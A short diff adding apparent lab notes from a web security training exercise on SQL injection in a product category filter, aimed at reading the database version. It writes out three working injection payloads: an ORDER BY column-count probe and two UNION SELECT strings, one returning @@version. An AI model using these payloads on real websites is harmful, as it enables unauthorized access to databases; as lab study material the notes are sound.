@@ -1,0 +1,21 @@
+Lab 8: SQL injection attack, querying the database type and version 
+on MySQL and Microsoft
+
+SQL Injection - Product Category Filter
+
+End Goal: find db version
+
+Analysis:
+
+(1) find number of columns
+' order by 3# ->> internalserver error
+
+3-1=2
+
+(2)Figure out which columns contain text
+' UNION SELECT 'a','a'#
+
+(3) Output the version
+' UNION SELECT @@version, NULL#
+
+
